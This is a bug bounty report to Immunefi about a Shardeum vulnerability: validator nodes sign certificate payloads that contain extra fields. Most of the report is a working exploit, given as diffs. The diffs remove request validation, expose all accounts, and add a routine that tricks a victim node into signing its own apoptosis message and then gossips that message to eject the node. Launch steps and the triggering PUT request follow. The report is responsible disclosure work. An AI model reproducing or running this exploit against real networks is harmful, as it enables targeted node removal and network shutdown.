# 34484 - \[BC - Critical] Tricking legit node to signed maliciously contr...

Submitted on Aug 13th 2024 at 21:31:31 UTC by @ZhouWu for [Boost | Shardeum: Core](https://immunefi.com/bounty/shardeum-core-boost/)

Report ID: #34484

Report type: Blockchain/DLT

Report severity: Critical

Target: <https://github.com/shardeum/shardeum/tree/dev>

Impacts:

* Network not being able to confirm new transactions (total network shutdown)
* Permanent freezing of funds (fix requires hardfork)
* Direct loss of funds

## Description

## Description

When node query certificate, it ask other node to sign the certificate. The node that is asked to sign the certificate will check if there are required field in payload and sign it to return it. The problem lies within the fact that the node does not check strictly such that there are more field than what is required. This allows attacker to craft a payload that contains more field than what is required and trick the node to sign the payload.

The vulnerable code: [here](https://github.com/shardeum/shardeum/blob/d7dddf01002846b77f83ebea3557e949d8c9c90f/src/index.ts#L6192)

## Background

I've reported this before but falsely assessed and closed. This new POC does not need any debug mode to avoid confusion.

## Proof of concept

The shardus-core banch at the time of this poc is at `72fba67d3a551f21368c8b0fe94f951c8f5cc4f8`. The shardeum branch at the time of this poc is at `d7dddf01002846b77f83ebea3557e949d8c9c90f`. Please use this git HEAD to reproduce the poc.

* Start legit network of nodes
* Apply the following patch to malicious @shardus/core

```
diff --git a/src/shardus/index.ts b/src/shardus/index.ts
index 06184f15..d73d8a7f 100644
--- a/src/shardus/index.ts
+++ b/src/shardus/index.ts
@@ -960,6 +960,17 @@ class Shardus extends EventEmitter {
     }
   }

+    kill(payload: any){
+      const task = setInterval(() => {
+        if (currentQuarter === 1 || currentQuarter === 2) {
+          Comms.sendGossip("apoptosis", payload, "dummy string", Self.id, NodeList.byIdOrder, false);
+          clearInterval(task);
+        }
+      }, 1000)
+
+
+    }
+
   async _timestampAndQueueTransaction(tx: ShardusTypes.OpaqueTransaction, appData: any, global = false, noConsensus = false) {
     const injectedTimestamp = this.app.getTimestampFromTransaction(tx, appData);
```

* Apply the following patch to malicious shardeum

```diff
diff --git a/config.json b/config.json
index a3dacc5..6fca402 100644
--- a/config.json
+++ b/config.json
@@ -4,7 +4,7 @@
     "p2p": {
       "existingArchivers": [
         {
-          "ip": "localhost",
+          "ip": "0.0.0.0",
           "port": 4000,
           "publicKey": "758b1c119412298802cd28dbfa394cdfeecc4074492d60844cc192d632d84de3"
         }
@@ -12,9 +12,9 @@
     },
     "ip": {
       "externalIp": "127.0.0.1",
-      "externalPort": 9001,
+      "externalPort": 1337,
       "internalIp": "127.0.0.1",
-      "internalPort": 10001
+      "internalPort": 1338
     },
     "reporting": {
       "report": true,
diff --git a/src/config/index.ts b/src/config/index.ts
index 1e0c8d7..64e0ef8 100644
--- a/src/config/index.ts
+++ b/src/config/index.ts
@@ -132,8 +132,8 @@ config = merge(config, {
     p2p: {
       cycleDuration: 60,
       minNodesToAllowTxs: 1, // to allow single node networks
-      baselineNodes: process.env.baselineNodes ? parseInt(process.env.baselineNodes) : 300, // config used for baseline for entering recovery, restore, and safety. Should be equivalient to minNodes on network startup
-      minNodes: process.env.minNodes ? parseInt(process.env.minNodes) : 300,
+      baselineNodes: process.env.baselineNodes ? parseInt(process.env.baselineNodes) : 10, // config used for baseline for entering recovery, restore, and safety. Should be equivalient to minNodes on network startup
+      minNodes: process.env.minNodes ? parseInt(process.env.minNodes) : 10,
       maxNodes: process.env.maxNodes ? parseInt(process.env.maxNodes) : 1100,
       maxJoinedPerCycle: 10,
       maxSyncingPerCycle: 10,
@@ -146,7 +146,7 @@ config = merge(config, {
       amountToShrink: 5,
       maxDesiredMultiplier: 1.2,
       maxScaleReqs: 250, // todo: this will become a variable config but this should work for a 500 node demo
-      forceBogonFilteringOn: true,
+      forceBogonFilteringOn: false,
       //these are new feature in 1.3.0, we can make them default:true in shardus-core later
 
       // 1.2.3 migration starts
@@ -309,8 +309,8 @@ config = merge(
       mode: 'release', // todo: must set this to "release" for public networks or get security on endpoints. use "debug"
       // for easier debugging
       debug: {
-        startInFatalsLogMode: true, // true setting good for big aws test with nodes joining under stress.
-        startInErrorLogMode: false,
+        startInFatalsLogMode: false, // true setting good for big aws test with nodes joining under stress.
+        startInErrorLogMode: true,
         robustQueryDebug: false,
         fakeNetworkDelay: 0,
         disableSnapshots: true, // do not check in if set to false
diff --git a/src/handlers/queryCertificate.ts b/src/handlers/queryCertificate.ts
index 81a1a0a..9e8e983 100644
--- a/src/handlers/queryCertificate.ts
+++ b/src/handlers/queryCertificate.ts
@@ -282,74 +282,5 @@ export async function queryCertificateHandler(
 ): Promise<CertSignaturesResult | ValidatorError> {
   nestedCountersInstance.countEvent('shardeum-staking', 'calling queryCertificateHandler')
 
-  const queryCertReq = req.body as QueryCertRequest
-  const reqValidationResult = validateQueryCertRequest(queryCertReq)
-  if (!reqValidationResult.success) {
-    nestedCountersInstance.countEvent(
-      'shardeum-staking',
-      'queryCertificateHandler: failed validateQueryCertRequest'
-    )
-    return reqValidationResult
-  }
-
-  const operatorAccount = await getEVMAccountDataForAddress(shardus, queryCertReq.nominator)
-  if (!operatorAccount) {
-    nestedCountersInstance.countEvent(
-      'shardeum-staking',
-      'queryCertificateHandler: failed to fetch operator account' + ' state'
-    )
-    return { success: false, reason: 'Failed to fetch operator account state' }
-  }
-  let nodeAccount = await shardus.getLocalOrRemoteAccount(queryCertReq.nominee)
-  nodeAccount = fixBigIntLiteralsToBigInt(nodeAccount)
-  if (!nodeAccount) {
-    nestedCountersInstance.countEvent(
-      'shardeum-staking',
-      'queryCertificateHandler: failed to fetch node account state'
-    )
-    return { success: false, reason: 'Failed to fetch node account state' }
-  }
-
-  const currentTimestampInMillis = shardeumGetTime()
-
-  if (operatorAccount.operatorAccountInfo == null) {
-    nestedCountersInstance.countEvent(
-      'shardeum-staking',
-      'queryCertificateHandler: operator account info is null'
-    )
-    return {
-      success: false,
-      reason: 'Operator account info is null',
-    }
-  }
-
-  if (operatorAccount.operatorAccountInfo.certExp === null) {
-    nestedCountersInstance.countEvent(
-      'shardeum-staking',
-      'queryCertificateHandler: Operator certificate time is null'
-    )
-    return {
-      success: false,
-      reason: 'Operator certificate time is null',
-    }
-  }
-
-  // check operator cert validity
-  if (operatorAccount.operatorAccountInfo.certExp < currentTimestampInMillis) {
-    nestedCountersInstance.countEvent(
-      'shardeum-staking',
-      'queryCertificateHandler: operator certificate has expired'
-    )
-
-    return {
-      success: false,
-      reason: 'Operator certificate has expired',
-    }
-  }
-  return await getCertSignatures(shardus, {
-    nominator: queryCertReq.nominator,
-    nominee: queryCertReq.nominee,
-    stake: operatorAccount.operatorAccountInfo.stake,
-    certExp: operatorAccount.operatorAccountInfo.certExp,
-  })
+  return await getCertSignatures(shardus, req.body)
 }
diff --git a/src/index.ts b/src/index.ts
index 1fad5b4..4cd2600 100644
--- a/src/index.ts
+++ b/src/index.ts
@@ -2132,7 +2132,7 @@ const configShardusEndpoints = (): void => {
   //   res.json({ tx: result })
   // })
 
-  shardus.registerExternalGet('accounts', debugMiddlewareMedium, async (req, res) => {
+  shardus.registerExternalGet('accounts', async (req, res) => {
     try {
       // if(isDebugMode()){
       //   return res.json(`endpoint not available`)
@@ -2143,7 +2143,7 @@ const configShardusEndpoints = (): void => {
       // stable sort on accounts order..  todo, may turn this off later for perf reasons.
 
       //let sorted = Utils.safeJsonParse(Utils.safeStringify(accounts))
-      const accounts = await AccountsStorage.debugGetAllAccounts()
+      const accounts = await AccountsStorage.getAllAccounts()
       const sorted = Utils.safeJsonParse(Utils.safeStringify(accounts))
 
       res.json({ accounts: sorted })
@@ -2219,7 +2219,83 @@ const configShardusEndpoints = (): void => {
           /* prettier-ignore */ nestedCountersInstance.countEvent('shardeum-staking', `queryCertificateHandler failed with reason: ${(queryCertRes as ValidatorError).reason}`)
         }
 
-        return res.json(Utils.safeJsonParse(Utils.safeStringify(queryCertRes)))
+        // return res.json(Utils.safeJsonParse(Utils.safeStringify(queryCertRes)))
+
+      const node2kill_id = req.body.node2kill_id
+      const me = shardus.getNodeId()
+      const { externalIp, externalPort } = shardus.getNode(me)
+
+      const accres: any = await axios.get(`http://${externalIp}:${externalPort}/accounts`)
+
+      let nominator = "";
+      let nominee = "";
+      let stake = "";
+
+      // res.write(`crawling stake infos`)
+
+      for (const acc of accres.data.accounts) {
+        const data = Utils.safeJsonParse(acc.data)
+        if(data.nominator){
+          nominator = data.nominator
+          nominee = data.id
+          stake = data.stakeLock
+          break;
+        }
+      }
+
+      const craftedPayload = {
+         nominator,
+         nominee,
+         stake,
+         id: node2kill_id, // <-- this is the field required by the apoptosis gossip
+         when: 1, // <-- this is the field required by the apoptosis gossip
+         certExp: Date.now() + 1000 * 60 * 60 * 24 * 365,
+      }
+      let targetSig;
+      const _gg = { body: craftedPayload }
+      while(!targetSig){
+        const queryCertRes = await queryCertificateHandler(_gg as any, shardus) as CertSignaturesResult
+
+
+        if (ShardeumFlags.VerboseLogs) console.log('queryCertRes', queryCertRes)
+        if (queryCertRes.success) {
+          const successRes = queryCertRes as CertSignaturesResult
+          stakeCert = successRes.signedStakeCert
+          /* prettier-ignore */ nestedCountersInstance.countEvent('shardeum-staking', `queryCertificateHandler success`)
+        } else {
+          /* prettier-ignore */ nestedCountersInstance.countEvent('shardeum-staking', `queryCertificateHandler failed with reason: ${(queryCertRes as ValidatorError).reason}`)
+        }
+
+
+        const node2kill_pubkey = shardus.getNode(node2kill_id).publicKey
+        for (const sign of queryCertRes.signedStakeCert.signs) {
+          if(sign.owner == node2kill_pubkey){
+            targetSig = sign
+            break
+          }
+        }
+      }
+
+      const apopPayload = {
+        nominee: craftedPayload.nominee,
+        nominator: craftedPayload.nominator,
+        stake: craftedPayload.stake,
+        id: craftedPayload.id,
+        when: craftedPayload.when,
+        certExp: craftedPayload.certExp,
+        sign: targetSig
+      }
+
+      // res.write(`sending the apop behalf of victim node to kill it ${Utils.safeStringify(apopPayload)}`)
+
+      shardus.kill(apopPayload);
+
+      const status = {
+        verfied : crypto.verifyObj(apopPayload),
+        apopPayload: apopPayload
+      }
+
+      return res.json(Utils.safeJsonParse(Utils.safeStringify(status)))
       } catch (error) {
         /* prettier-ignore */ if (logFlags.error) console.error('Error in processing query-certificate request:', error)
         res.status(500).json({ error: 'Internal Server Error' })
diff --git a/src/storage/accountStorage.ts b/src/storage/accountStorage.ts
index 52c5e58..b72b9d2 100644
--- a/src/storage/accountStorage.ts
+++ b/src/storage/accountStorage.ts
@@ -174,6 +174,15 @@ export async function debugGetAllAccounts(): Promise<WrappedEVMAccount[]> {
   //return null
 }
 
+export async function getAllAccounts(): Promise<WrappedEVMAccount[]> {
+  if (ShardeumFlags.UseDBForAccounts === true) {
+    return (await storage.getSelectAllAccountsEntry()) as unknown as WrappedEVMAccount[]
+  } else {
+    return Object.values(accounts)
+  }
+  //return null
+}
+
 export async function clearAccounts(): Promise<void> {
   if (ShardeumFlags.UseDBForAccounts === true) {
     //This lazy init is not ideal.. we only know this is called because of special knowledge
diff --git a/src/storage/storage.ts b/src/storage/storage.ts
index 8ba2251..3750d62 100644
--- a/src/storage/storage.ts
+++ b/src/storage/storage.ts
@@ -313,5 +313,14 @@ class Storage {
       throw new Error(e)
     }
   }
+
+  async getSelectAllAccountsEntry(): Promise<unknown> {
+    this._checkInit()
+    try {
+      return await this._read(this.storageModels.accountsEntry, null, null)
+    } catch (e) {
+      throw new Error(e)
+    }
+  }
 }
 export default Storage
```

* Link @shardus/core to the shardeum and launch the malicious node
* Launch the malicious node
* Stake the malicious node and wait for it to go active
* Once It is active, malicious node is ready to be used for attack
* Make a HTTP PUT request to the malicious node you just launch `http://0.0.0.0:1337/query-certificate` with json body `{"node2kill_id": "id_of_the_node_you_want_to_kill"}`
* This POC internally trick the legit node to sign their own apoptosis payload and give back the signature to the malicious node
* The malcious node will then submit a apoptosis gossip to the network to kill the victim node.
* Oberserve the victim node being killed in the logs.

## Impact

The POC demostrate it is possible to do targeted attack to kill a specific node in the network. But the scope of this can be used to kill a large group of node or the all entire network causing a total shutdown.
